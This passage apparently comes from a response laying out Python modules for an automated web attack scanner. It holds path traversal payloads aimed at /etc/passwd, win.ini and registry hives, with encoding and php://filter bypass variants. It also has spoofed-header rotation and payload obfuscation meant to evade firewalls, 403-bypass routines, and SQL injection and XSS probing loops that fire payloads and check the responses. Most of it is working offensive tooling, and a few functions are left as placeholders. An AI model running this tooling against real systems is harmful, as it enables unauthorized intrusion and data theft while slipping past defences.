        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\Administrator\\NTUser.dat", # Registry Hive
    ],
    "encoding_bypass": [
        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL Encoded /
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini", # URL Encoded \
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # URL Encoded .
        "..%c0%af..%c0%afetc/passwd", # Invalid UTF-8 /
        "..%c1%9c..%c1%9cboot.ini", # Invalid UTF-8 \
        "....//....//....//etc/passwd", # Using //
        "....\\\\....\\\\....\\\\windows\\\\win.ini", # Using \\
    ],
    "null_byte_bypass": [ # Often ineffective on modern systems
        "../../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini%00",
    ],
    "wrapper_bypass": [ # If PHP wrappers are enabled
        "php://filter/resource=../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "file:///etc/passwd",
    ]
}

# Add other categories as needed: SSRF, Header Injection, NoSQL Injection, etc.
```

---

**3. `console_manager.py` (New - Complete)**

```python
import sys
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.syntax import Syntax
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
from rich.theme import Theme

# Define a custom theme (optional)
custom_theme = Theme({
    "info": "dim cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "green",
    "debug": "dim",
    "attack": "cyan",
    "vuln": "bold magenta",
    "severity_critical": "bold red",
    "severity_high": "red",
    "severity_medium": "yellow",
    "severity_low": "cyan",
    "severity_info": "blue",
})

class ConsoleManager:
    def __init__(self, verbose: bool = False, no_color: bool = False):
        self.console = Console(theme=custom_theme, no_color=no_color, stderr=True)
        self.verbose = verbose

    def print_info(self, message):
        self.console.print(f"[info][*] {message}[/info]")

    def print_success(self, message):
        self.console.print(f"[success][+][/success] {message}")

    def print_warning(self, message):
        self.console.print(f"[warning][!] {message}[/warning]")

    def print_error(self, message, fatal=False):
        prefix = "[error][ERROR][/error]" if fatal else "[error][-][/error]"
        self.console.print(f"{prefix} {message}")
        if fatal:
            sys.exit(1)

    def print_debug(self, message):
        """Prints only if verbose is enabled."""
        if self.verbose:
            self.console.print(f"[debug][DEBUG] {message}[/debug]")

    def print_finding(self, finding_type: str, severity: str, details: Any, url: str = ""):
        severity_upper = severity.upper()
        severity_style = f"severity_{severity_upper.lower()}"

        title = f"[{severity_style}]{severity_upper}[/{severity_style}] {finding_type}"
        content = f"[bold]URL:[/bold] {url}\n" if url else ""

        if isinstance(details, dict):
            # Nicer formatting for dict details
            for k, v in details.items():
                 # Limit long values
                 v_str = str(v)
                 if len(v_str) > 200:
                      v_str = v_str[:200] + "..."
                 content += f"  [bold]{str(k).replace('_', ' ').title()}:[/bold] {v_str}\n"
            # Remove trailing newline
            content = content.rstrip()
        else:
            details_str = str(details)
            if len(details_str) > 500:
                 details_str = details_str[:500] + "..."
            content += details_str

        self.console.print(Panel(content, title=title, border_style=severity_style, expand=False, padding=(0, 1)))

    def print_attack_attempt(self, url: str, method: str, payload_type: str, payload: str, status: int, response_len: int, is_vuln: bool = False, verification_method: str = ""):
        status_color = "success" if status < 300 else "warning" if status < 400 else "error"
        vuln_marker = f"[vuln][VULN: {verification_method}][/vuln]" if is_vuln else ""
        payload_display = payload.replace('\n', '\\n').replace('\r', '\\r')
        if len(payload_display) > 80:
             payload_display = payload_display[:80] + '...'

        self.console.print(f"[attack][ATTEMPT][/attack] {method} {url} - Type: [yellow]{payload_type}[/yellow] - Payload: '{payload_display}' -> Status: [{status_color}]{status}[/{status_color}] (Len: {response_len}) {vuln_marker}")

    def print_summary(self, summary: dict):
        self.console.rule("[bold] Scan Summary [/bold]", style="info")

        sev_table = Table(title="Findings by Severity", show_header=True, header_style="bold magenta")
        sev_table.add_column("Severity", style="dim", width=12)
        sev_table.add_column("Count", justify="right")

        severities = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        for sev in severities:
            count = summary.get("by_severity", {}).get(sev.lower(), 0)
            if count > 0:
                sev_style = f"severity_{sev.lower()}"
                sev_table.add_row(f"[{sev_style}]{sev}[/{sev_style}]", str(count))
        if sev_table.row_count > 0:
             self.console.print(sev_table)
        else:
             self.print_info("No findings reported by severity.")


        type_table = Table(title="Findings by Type", show_header=True, header_style="bold blue")
        type_table.add_column("Type", style="dim")
        type_table.add_column("Count", justify="right")
        # Sort by count descending
        sorted_types = sorted(summary.get("by_type", {}).items(), key=lambda item: item[1], reverse=True)
        for f_type, count in sorted_types:
             if count > 0:
                type_table.add_row(f_type, str(count))
        if type_table.row_count > 0:
             self.console.print(type_table)
        else:
             self.print_info("No findings reported by type.")


        if summary.get("vulnerable_endpoints"):
             self.console.print("\n[bold yellow]Potentially Vulnerable Endpoints:[/bold yellow]")
             for ep in summary["vulnerable_endpoints"]:
                 self.console.print(f"- {ep}")

        # Add more summary sections if needed (DB connections, services, etc.)
        self.console.rule(style="info")


    def print_code(self, code: str, language: str = "javascript", title: str = "Code Snippet"):
        """Prints syntax highlighted code."""
        if not code:
            self.print_warning(f"Attempted to print empty code block for '{title}'")
            return
        try:
            syntax = Syntax(code, language, theme="default", line_numbers=True)
            self.console.print(Panel(syntax, title=title, border_style="blue", expand=False))
        except Exception as e:
            self.print_error(f"Failed to highlight code for {title}: {e}")
            self.console.print(Panel(code, title=f"{title} (plaintext)", border_style="red"))


    def create_progress(self, description="Processing..."):
         """Creates a Rich Progress context manager."""
         return Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            # TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            console=self.console,
            transient=True # Clears progress bar on completion
         )
```

---

**4. `smart_detector.py` (Refactored - Snippets)**

```python
import random
import time
import base64
import html
import urllib.parse
from typing import List, Dict, Any, Optional
import re
import logging # Use standard logging

class SmartDetector:
    def __init__(self, console_manager, interactsh_url: Optional[str] = None):
        # Use standard logging instead of custom setup if ConsoleManager handles output
        self.logger = logging.getLogger('SmartDetector')
        self.console = console_manager # Use ConsoleManager for output
        self.interactsh_url = interactsh_url

        # User-Agents remain the same
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0",
            # Add more diverse and less common ones
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
        ]

        # WAF Evasion Headers - Expanded
        self.waf_evasion_headers_pool = [
            {"X-Forwarded-For": self._generate_random_ip()},
            {"X-Originating-IP": self._generate_random_ip()},
            {"X-Remote-IP": self._generate_random_ip()},
            {"X-Remote-Addr": self._generate_random_ip()},
            {"X-Client-IP": self._generate_random_ip()},
            {"X-Real-IP": self._generate_random_ip()},
            {"Forwarded": f"for={self._generate_random_ip()};proto=https"},
            {"X-Forwarded-Host": f"example-{random.randint(1,100)}.com"},
            {"X-Host": f"internal-app-{random.randint(1,100)}"},
            {"X-Custom-Header": f"Value{random.randint(1000,9999)}"},
            {"Accept-Language": random.choice(["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7", "*"])},
            {"Referer": random.choice([f"https://www.google.com/search?q=query{random.randint(1,100)}", "https://www.bing.com/", "https://duckduckgo.com/", f"https://internal.portal/dashboard{random.randint(1,10)}"])},
            {"Accept-Encoding": random.choice(["gzip, deflate, br", "gzip", "deflate", "*", "identity"])},
            {"Upgrade-Insecure-Requests": random.choice(["0", "1"])},
            {"Cache-Control": random.choice(["no-cache", "max-age=0"])},
            {"Content-Type": random.choice(["application/json", "application/xml", "application/x-www-form-urlencoded", "text/plain"])}, # For POST/PUT
             # Add headers that might bypass specific WAF rules
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Forwarded-Proto": "https"},
            {"Via": f"1.1 google"}, # Simulate passing through proxies
        ]

        # Interactive Attributes remain similar, but logic is in JS evaluation
        self.interactive_attributes = {
             "visual_cues": [
                "style.cursor === 'pointer'",
                "(el.offsetWidth > 10 && el.offsetHeight > 10)", # Element has dimensions
                "(style.backgroundColor !== 'transparent' || style.backgroundImage !== 'none')", # Has background
                "(style.borderWidth !== '0px' && style.borderStyle !== 'none')", # Has border
                "style.visibility !== 'hidden' && style.display !== 'none' && style.opacity !== '0'", # Is visible
             ],
             "behavior_cues": [
                "el.onclick !== null",
                "el.onmouseover !== null",
                "el.onfocus !== null",
                "typeof $ !== 'undefined' && $._data && $._data(el, 'events')", # jQuery events
                "el.hasAttribute('click')", # Common framework attributes
                "el.hasAttribute('ng-click')",
                "el.hasAttribute('v-on:click')",
                "el.hasAttribute('@click')",
                "el.matches('[onclick], [onmouseover], [onfocus], [data-action], [js-action]')", # Check attributes directly
             ],
             "semantic_cues": [
                "['BUTTON', 'A', 'INPUT', 'TEXTAREA', 'SELECT', 'DETAILS'].includes(el.tagName)",
                "(el.tagName === 'INPUT' && ['submit', 'button', 'reset', 'image'].includes(el.type))",
                "el.getAttribute('role') === 'button' || el.getAttribute('role') === 'link' || el.getAttribute('role') === 'menuitem' || el.getAttribute('role') === 'tab'",
                "el.matches('[class*=\"btn\"], [class*=\"button\"], [class*=\"link\"], [class*=\"nav\"], [class*=\"menu\"], [class*=\"action\"]')",
                "el.isContentEditable"
             ],
             "text_cues": [ # Less reliable, lower score weight maybe
                "el.textContent && ['submit', 'send', 'login', 'register', 'buy', 'add', 'search', 'go', 'continue', 'next', 'more', 'click', 'view', 'update', 'save', 'delete'].some(t => el.textContent.trim().toLowerCase().includes(t))"
             ]
        }

        # Error Codes remain similar
        self.error_codes = { ... } # Keep as is

        # Payload Counters
        self.identity_rotation_counter = 0
        self.payload_obfuscation_counter = 0

    def _generate_random_ip(self) -> str:
        # Prioritize common private/public ranges slightly
        first_octet = random.choice([10, 172, 192, random.randint(1, 223)])
        if first_octet == 172:
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif first_octet == 192:
            return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif first_octet == 10:
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:
            # Avoid reserved ranges like 127.0.0.0/8, 169.254.0.0/16 etc. for external IPs
            while first_octet == 127 or first_octet == 169 or first_octet >= 224:
                first_octet = random.randint(1, 223)
            return f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    async def get_next_user_agent_and_headers(self) -> Dict:
        """Gets a random User-Agent and a selection of WAF evasion headers."""
        user_agent = random.choice(self.user_agents)
        num_headers = random.randint(2, 5) # Add more random headers
        selected_header_dicts = random.sample(self.waf_evasion_headers_pool, num_headers)

        final_headers = {"User-Agent": user_agent}
        header_keys_added = set(["user-agent"]) # Track keys to avoid duplicates like multiple X-Forwarded-For

        for header_dict in selected_header_dicts:
            key = list(header_dict.keys())[0]
            value = header_dict[key]
            # Normalize key for checking duplicates
            norm_key = key.lower()
            if norm_key not in header_keys_added:
                final_headers[key] = value
                header_keys_added.add(norm_key)

        self.console.print_debug(f"Rotated Identity: UA={user_agent[:20]}..., Headers={list(final_headers.keys())}")
        return final_headers

    async def should_rotate_identity(self) -> bool:
        """Determines if it's time to rotate identity headers."""
        self.identity_rotation_counter += 1
        # Rotate more frequently initially, then less often
        rotate_threshold = random.randint(3, 8) if self.identity_rotation_counter < 50 else random.randint(10, 20)
        return self.identity_rotation_counter % rotate_threshold == 0

    async def detect_interactive_elements(self, page) -> List[Dict]:
        """Detects interactive elements using a scoring system based on JS evaluation."""
        self.console.print_info("Detecting interactive elements...")

        # Combine cues into a JS function for evaluation
        visual_check = ' || '.join(f"({c})" for c in self.interactive_attributes['visual_cues'])
        behavior_check = ' || '.join(f"({c})" for c in self.interactive_attributes['behavior_cues'])
        semantic_check = ' || '.join(f"({c})" for c in self.interactive_attributes['semantic_cues'])
        text_check = ' || '.join(f"({c})" for c in self.interactive_attributes['text_cues'])

        # Inject helper function if needed (e.g., for deep event checks) - omitted for brevity here

        js_code = f"""
            () => {{
                const elementsData = [];
                const allElements = document.querySelectorAll('body *'); // Query within body

                allElements.forEach(el => {{
                    try {{
                        // Avoid analyzing the analyzer's own elements if any were added
                        if (el.closest('[data-robot-hunter-ignore]')) return;

                        const style = window.getComputedStyle(el);
                        let score = 0;
                        const reasons = [];

                        // Check visibility first - skip if not visible
                        if (!(el.offsetWidth > 0 && el.offsetHeight > 0 && style.visibility !== 'hidden' && style.display !== 'none' && style.opacity !== '0')) {{
                           return;
                        }}

                        if ({visual_check}) {{ score += 1; reasons.push('visual'); }}
                        if ({behavior_check}) {{ score += 3; reasons.push('behavior'); }}
                        if ({semantic_check}) {{ score += 2; reasons.push('semantic'); }}
                        if ({text_check}) {{ score += 1; reasons.push('text'); }}

                        // Minimum score threshold
                        if (score >= 2) {{
                            const rect = el.getBoundingClientRect();
                            elementsData.push({{
                                // Cannot return the element object directly, need serializable data
                                // Instead, generate a unique CSS selector
                                selector: generateCssSelector(el),
                                score: score,
                                reasons: reasons,
                                text: el.textContent?.trim()?.substring(0, 50) || el.value?.substring(0,50) || el.name || el.id || '',
                                tag: el.tagName,
                                attributes: Array.from(el.attributes).reduce((acc, attr) => {{ acc[attr.name] = attr.value; return acc; }}, {{}}),
                                is_visible: true, // Already checked
                                bounding_box: {{ top: rect.top, left: rect.left, width: rect.width, height: rect.height }}
                            }});
                        }}
                    }} catch (e) {{
                        // Ignore errors for specific elements, maybe log them if verbose
                        // console.error("Error processing element:", el, e);
                    }}
                }});

                // Helper to generate a unique CSS selector
                function generateCssSelector(el) {{
                    if (!(el instanceof Element)) return;
                    const path = [];
                    while (el.nodeType === Node.ELEMENT_NODE) {{
                        let selector = el.nodeName.toLowerCase();
                        if (el.id) {{
                            selector += '#' + el.id;
                            path.unshift(selector);
                            break; // ID should be unique
                        }} else {{
                            let sib = el, nth = 1;
                            while (sib = sib.previousElementSibling) {{
                                if (sib.nodeName.toLowerCase() == selector) nth++;
                            }}
                            if (nth != 1) selector += ":nth-of-type("+nth+")";
                        }}
                        path.unshift(selector);
                        el = el.parentNode;
                    }}
                    return path.join(" > ");
                }}

                // Sort by score, potentially prioritizing certain types or visibility
                return elementsData.sort((a, b) => b.score - a.score);
            }}
        """
        try:
            elements_data = await page.evaluate(js_code)
            self.console.print_info(f"Found {len(elements_data)} potentially interactive elements.")
            for element in elements_data[:5]: # Log top 5
                self.console.print_debug(f"  -> Tag: {element['tag']}, Score: {element['score']}, Text: '{element['text']}', Selector: {element['selector'][:60]}...")
            return elements_data # Return serializable data
        except Exception as e:
            self.console.print_error(f"Error detecting interactive elements via JS: {e}")
            self.console.print_debug(f"Failing JS Code:\n{js_code}")
            return []


    async def detect_forms(self, page) -> List[Dict]:
        """Detects standard forms and pseudo-forms using JS evaluation."""
        self.console.print_info("Detecting forms...")
        # JS code similar to previous example, ensuring serializable data is returned
        # It should identify inputs, selects, textareas, potential submit buttons, action/method
        # For pseudo-forms, group inputs based on proximity or parent element.
        try:
            forms_data = await page.evaluate("""
                // Complex JS to find forms and pseudo-forms, returning serializable data
                // including selectors for inputs and submit buttons.
                // ... (Implementation similar to previous description, focus on selectors)
                return []; // Placeholder
            """)
            standard_forms = len([f for f in forms_data if f['type'] == 'standard_form'])
            pseudo_forms = len([f for f in forms_data if f['type'] == 'pseudo_form'])
            self.console.print_info(f"Detected Forms: {len(forms_data)} (Standard: {standard_forms}, Pseudo: {pseudo_forms})")
            return forms_data
        except Exception as e:
            self.console.print_error(f"Error detecting forms via JS: {e}")
            return []

    def obfuscate_payload(self, payload: str, level: int = 1) -> str:
        """Applies WAF evasion techniques to payloads."""
        if level <= 0: return payload

        original_payload = payload
        techniques_applied = []

        # Simple Replacement Pool (Level 1)
        replacements = {
            " ": ["/**/", "%09", "%20", "+"],
            "=": ["= ", "%3d"],
            "'": ["%27", "`"],
            "\"": ["%22", "`"],
            "(": ["%28"],
            ")": ["%29"],
            "<": ["%3c"],
            ">": ["%3e"],
            ";": ["%3b"],
            "|": ["%7c"],
            "&": ["%26"],
        }
        # Keyword Case Variation/Comments (Level 1/2)
        keywords_sql = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
        keywords_script = ["SCRIPT", "ALERT", "ONERROR", "IMG", "SVG", "EVAL"]
        keywords_cmd = ["SLEEP", "CAT", "WHOAMI", "SYSTEMINFO", "TYPE"]

        # --- Apply Techniques based on Level ---

        # Level 1: Simple space/char replacement, case variation, basic comments
        if level >= 1:
            # Random space replacement
            for _ in range(random.randint(1, 3)): # Apply a few times
                 if ' ' in payload:
                      payload = payload.replace(' ', random.choice(replacements[' ']), 1)
                      techniques_applied.append("space_replace")

            # Random char replacement
            char_to_replace = random.choice(list(replacements.keys()))
            if char_to_replace != ' ' and char_to_replace in payload:
                 payload = payload.replace(char_to_replace, random.choice(replacements[char_to_replace]), 1)
                 techniques_applied.append("char_replace")

            # Random keyword case variation
            all_keywords = keywords_sql + keywords_script + keywords_cmd
            kw_to_vary = random.choice(all_keywords)
            if re.search(kw_to_vary, payload, re.IGNORECASE):
                 payload = re.sub(f"({kw_to_vary})", lambda m: ''.join(random.choice([c.upper(), c.lower()]) for c in m.group(1)), payload, count=1, flags=re.IGNORECASE)
                 techniques_applied.append("case_vary")

        # Level 2: More encoding, versioned comments, URL encoding
        if level >= 2:
            # MySQL versioned comment (if likely SQLi)
            if any(kw in original_payload.upper() for kw in keywords_sql) and random.random() < 0.4:
                parts = payload.split(" ")
                if len(parts) > 1:
                    idx = random.randint(0, len(parts)-2)
                    parts.insert(idx+1, f"/*!50000{parts[idx+1]}*/")
                    del parts[idx+2] # remove original
                    payload = " ".join(parts)
                    techniques_applied.append("mysql_comment")

            # Partial URL Encoding
            if random.random() < 0.5:
                 char_to_encode = random.choice("=()<>;&|'")
                 payload = payload.replace(char_to_encode, urllib.parse.quote(char_to_encode), 1)
                 techniques_applied.append("partial_urlencode")

        # Level 3: Full URL encoding, Base64 (context specific!), HTML Entities
        if level >= 3:
            if random.random() < 0.3: # Full encode less often
                 payload = urllib.parse.quote(payload)
                 techniques_applied.append("full_urlencode")

            # HTML Entity (useful for XSS)
            elif 'alert' in original_payload and random.random() < 0.5:
                payload = payload.replace('alert(1)', ''.join(f"&#{ord(c)};" for c in 'alert(1)'))
                techniques_applied.append("html_entity")

        self.console.print_debug(f"Payload Obfuscation ({original_payload[:30]}... -> {payload[:40]}...): Techniques={techniques_applied}")
        return payload

    # log_response_status - keep as is, maybe add more context/details
    async def log_response_status(self, response, context: str = "") -> Dict:
         # ... (Keep previous implementation) ...
         pass
```

---

**5. `attack_engine.py` (Refactored - More Complete Structure)**

```python
import asyncio
import time
import random
import json
import httpx
from urllib.parse import urlparse, urljoin, parse_qs
import base64
import re

# Assuming payloads.py exists with payload dictionaries
from payloads import SQLI_PAYLOADS, XSS_PAYLOADS, CMD_PAYLOADS, SSTI_PAYLOADS, PATH_TRAVERSAL_PAYLOADS
from console_manager import ConsoleManager
from smart_detector import SmartDetector # Assuming SmartDetector is passed

class AttackEngine:
    def __init__(self, console_manager: ConsoleManager, smart_detector: SmartDetector, interactsh_url=None):
        self.console = console_manager
        self.detector = smart_detector
        self.interactsh_url = interactsh_url
        self.findings = []
        self.tested_endpoints = {} # Key: f"{method}:{url}:{param_name}:{vuln_type}"
        self.client = httpx.AsyncClient(http2=True, verify=False, follow_redirects=True, timeout=20.0) # Persistent client

    async def close_client(self):
        """Closes the httpx client."""
        await self.client.aclose()

    def record_finding(self, type: str, severity: str, details: dict, url: str):
        """Records and prints a finding."""
        finding = {
            "type": type,
            "severity": severity,
            "url": url,
            "details": details,
            "timestamp": time.time()
        }
        self.findings.append(finding)
        # Print finding immediately using ConsoleManager
        self.console.print_finding(type, severity, details, url)

    def _get_test_key(self, method, url, param, vuln_type):
        """Generates a unique key for tracking tested parameters."""
        # Normalize URL slightly by removing fragment
        url_parsed = urlparse(url)
        url_norm = url_parsed._replace(fragment="").geturl()
        return f"{method}:{url_norm}:{param}:{vuln_type}"

    def _mark_tested(self, key):
        """Marks a test key as completed."""
        self.tested_endpoints[key] = True

    def _was_tested(self, key):
        """Checks if a test key was completed."""
        return key in self.tested_endpoints

    async def _make_request(self, url, method="GET", params=None, data=None, headers=None, payload_info=""):
        """Helper to make requests with httpx, handling errors and logging."""
        req_headers = await self.detector.get_next_user_agent_and_headers()
        if headers:
            req_headers.update(headers)

        try:
            self.console.print_debug(f"Requesting [{payload_info}]: {method} {url} Params: {params} Data: {data}")
            response = await self.client.request(
                method,
                url,
                params=params,
                data=data,
                headers=req_headers,
                # follow_redirects=True, # Client handles this
                # timeout=15 # Client handles this
            )
            return response
        except httpx.TimeoutException:
            self.console.print_warning(f"Request timed out for {url} [{payload_info}]")
            return None
        except httpx.RequestError as e:
            self.console.print_warning(f"Request failed for {url} [{payload_info}]: {e}")
            return None
        except Exception as e:
            self.console.print_error(f"Unexpected error during request to {url} [{payload_info}]: {e}")
            return None

    async def handle_forbidden(self, url: str) -> bool:
        """Attempts to bypass 403 Forbidden using custom techniques."""
        self.console.print_warning(f"403 Detected for {url}. Attempting bypass techniques...")
        original_parsed = urlparse(url)
        base_url = f"{original_parsed.scheme}://{original_parsed.netloc}"
        path = original_parsed.path if original_parsed.path else "/"

        # Techniques adapted from nomore403 concepts
        bypass_attempts = []

        # 1. Method Switching
        for method in ["POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
            bypass_attempts.append({"method": method, "url": url, "desc": f"Method={method}"})

        # 2. Path variations
        paths_to_try = [
            path,
            path + '/',
            f"/{path.strip('/')}",
            f"/{path.strip('/')}/",
            f"{path}/.",
            f"{path}/..;", # Odd but sometimes works
            f"{path}.json", f"{path}.xml", f"{path}.config", f"{path}.bak", # Common extensions
            path.upper(),
            path.lower(),
            f"/{path.strip('/')}/%2e", # /path/.
            f"/{path.strip('/')}/%2e/", # /path/./
            f"/{path.strip('/')}//", # Double slash
        ]
        # Add case variations if path has letters
        if any(c.isalpha() for c in path):
             paths_to_try.append(''.join(random.choice([c.upper(), c.lower()]) for c in path))

        for p_var in set(paths_to_try): # Use set to avoid duplicates
             bypass_url = urljoin(base_url, p_var)
             if original_parsed.query:
                 bypass_url += "?" + original_parsed.query
             if bypass_url != url: # Avoid re-testing original
                 bypass_attempts.append({"method": "GET", "url": bypass_url, "desc": f"Path={p_var}"})

        # 3. Header injections
        headers_to_try = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"Referer": base_url},
            {"Referer": url},
            {"Content-Length": "0"}, # For POST/PUT
        ]
        for h in headers_to_try:
             bypass_attempts.append({"method": ("POST" if "Content-Length" in h else "GET"), "url": url, "headers": h, "desc": f"Header={list(h.keys())[0]}"})


        # --- Execute Attempts ---
        for attempt in bypass_attempts:
            await asyncio.sleep(random.uniform(0.1, 0.3)) # Small delay
            self.console.print_debug(f"403 Bypass Attempt: {attempt['desc']} on {attempt['url']}")
            response = await self._make_request(
                url=attempt["url"],
                method=attempt.get("method", "GET"),
                headers=attempt.get("headers"),
                payload_info=f"403 Bypass ({attempt['desc']})"
            )

            if response and response.status_code != 403:
                 bypass_successful = True
                 self.console.print_success(f"Potential 403 Bypass FOUND for {url} -> {attempt['url']} ({attempt['method']}) with '{attempt['desc']}' - Status: {response.status_code}")
                 self.record_finding("forbidden_bypass", "HIGH", {
                     "original_url": url,
                     "bypass_url": attempt['url'],
                     "bypass_method": attempt.get('method', 'GET'),
                     "bypass_technique": attempt['desc'],
                     "resulting_status": response.status_code,
                 }, url)
                 return True # Exit after first successful bypass

        self.console.print_info(f"No obvious 403 bypass found for {url} with tested techniques.")
        return False

    async def test_vulnerability(self, url: str, method: str = "GET", params: dict = None, data: dict = None):
        """Main function to test multiple vulnerabilities on an endpoint/params."""
        params = params or {}
        data = data or {}
        target_fields = list(params.keys()) + list(data.keys())

        # If no params/data, maybe it's a path-based vuln target?
        if not target_fields and '?' not in url and not data:
             await self.test_path_traversal(url, method)
             # Could also test for SSTI in path if applicable contextually

        # Test each parameter/data field
        for field in target_fields:
            if field: # Ensure field name is not empty
                await self.test_sqli(url, method, params, data, field)
                await self.test_xss(url, method, params, data, field)
                await self.test_cmdi(url, method, params, data, field)
                await self.test_ssti(url, method, params, data, field)
                # Add other tests like SSRF, Header Injection (if applicable contextually) here

    async def test_sqli(self, url, method, base_params, base_data, field):
        """Tests for SQL Injection on a specific field."""
        vuln_type = "SQLi"
        test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return
        self._mark_tested(test_key)

        self.console.print_info(f"Testing SQLi on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, '1'))

        sleep_time = 5 # Reduced sleep time

        async def run_check(payload_category, check_payloads, verification_func, verification_desc):
            for payload_template in check_payloads:
                payload = payload_template # Assume template is usable directly for error/boolean
                if "SLEEP_TIME" in payload_template:
                     payload = payload_template.replace("SLEEP_TIME", str(sleep_time))
                elif "INTERACTSH_URL" in payload_template:
                     if not self.interactsh_url: continue # Skip OOB if no server configured
                     payload = payload_template.replace("INTERACTSH_URL", self.interactsh_url)

                # Apply obfuscation randomly
                obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(1, 2))
                test_val = str(original_value) + obfuscated_payload

                current_params = base_params.copy()
                current_data = base_data.copy()
                if field in current_params: current_params[field] = test_val
                if field in current_data: current_data[field] = test_val

                start_time = time.time()
                response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"SQLi-{payload_category}")
                duration = time.time() - start_time

                if response is not None: # Check if request succeeded
                    is_vuln, details = verification_func(response, duration, sleep_time)
                    self.console.print_attack_attempt(url, method, f"SQLi-{payload_category}", test_val, response.status_code, len(response.content), is_vuln, verification_desc)
                    if is_vuln:
                        self.record_finding(f"sql_injection_{payload_category.lower()}", "CRITICAL", {
                             "field": field,
                             "payload_used": payload, # Original payload for clarity
                             "obfuscated_payload": obfuscated_payload,
                             "test_value": test_val,
                             "verification": f"{verification_desc} ({details})"
                         }, url)
                        return True # Found vuln for this category/field
            return False

        # Run checks sequentially for the field
        if await run_check("error", SQLI_PAYLOADS['error_based'], self._verify_sqli_error, "Error Message"): return
        if await run_check("time", SQLI_PAYLOADS['blind_time'], self._verify_sqli_time, f"Time Delay >{sleep_time}s"): return
        # Add boolean based check (more complex, needs baseline diff)
        # if await run_check("oob", SQLI_PAYLOADS['oob'], self._verify_sqli_oob, "OOB Interaction"): return

    def _verify_sqli_error(self, response: httpx.Response, duration, sleep_time) -> (bool, str):
        """Checks response for common SQL error messages."""
        if not response: return False, "No Response"
        text = response.text.lower()
        errors = [
            "sql syntax", "mysql", "syntax error", "unclosed quotation", "unterminated string",
            "pg_query", "postgresql", "ora-", "oracle", "sqlite", "odbc driver",
            "invalid column name", "error converting data type", "you have an error in your sql syntax",
            "warning: mysql",
        ]
        found_errors = [err for err in errors if err in text]
        return bool(found_errors), f"Detected: {', '.join(found_errors)}" if found_errors else "No Error Found"

    def _verify_sqli_time(self, response: httpx.Response, duration, sleep_time) -> (bool, str):
        """Checks if response time indicates time-based blind SQLi."""
        # Consider network latency, add a buffer (e.g., 80% of sleep time)
        lower_bound = sleep_time * 0.8
        is_delayed = duration >= lower_bound
        return is_delayed, f"Duration={duration:.2f}s"

    # --- Implement other test methods ---

    async def test_xss(self, url, method, base_params, base_data, field):
        vuln_type = "XSS"
        test_key = self._get_test_key(method, url, field, vuln_type)
        if self._was_tested(test_key): return
        self._mark_tested(test_key)

        self.console.print_info(f"Testing XSS on: {method} {url} (Field: {field})")
        original_value = base_params.get(field, base_data.get(field, ''))
        unique_marker = f"robotHunter{random.randint(1000,9999)}"

        for category, payloads in XSS_PAYLOADS.items():
             if isinstance(payloads, dict): # Skip framework specific for now
                 continue
             for payload_template in payloads:
                  # Inject unique marker to help find reflection
                  payload = payload_template.replace("alert(1)", f"alert('{unique_marker}')").replace("`1`", f"`{unique_marker}`")
                  obfuscated_payload = self.detector.obfuscate_payload(payload, level=random.randint(0, 1)) # Less obfuscation for reflection checks
                  test_val = str(original_value) + obfuscated_payload

                  current_params = base_params.copy()
                  current_data = base_data.copy()
                  if field in current_params: current_params[field] = test_val
                  if field in current_data: current_data[field] = test_val

                  response = await self._make_request(url, method, params=current_params, data=current_data, payload_info=f"XSS-{category}")

                  if response:
                       is_vuln, details = self._verify_xss_reflection(response, obfuscated_payload, unique_marker)
                       self.console.print_attack_attempt(url, method, f"XSS-{category}", test_val, response.status_code, len(response.content), is_vuln, "Reflection")
                       if is_vuln:
                           self.record_finding(f"xss_reflected_{category.lower()}", "HIGH", {
                               "field": field,
                               "payload_used": payload,
                               "obfuscated_payload": obfuscated_payload,
                               "test_value": test_val,
                               "verification": f"Reflected Unescaped ({details})"
                           }, url)
                           # Consider stopping XSS tests for this field after finding one
                           return

    def _verify_xss_reflection(self, response: httpx.Response, payload: str, marker: str) -> (bool, str):
        """Checks if the payload is reflected unescaped in the response."""
        if not response or not payload: return False, "No Response/Payload"
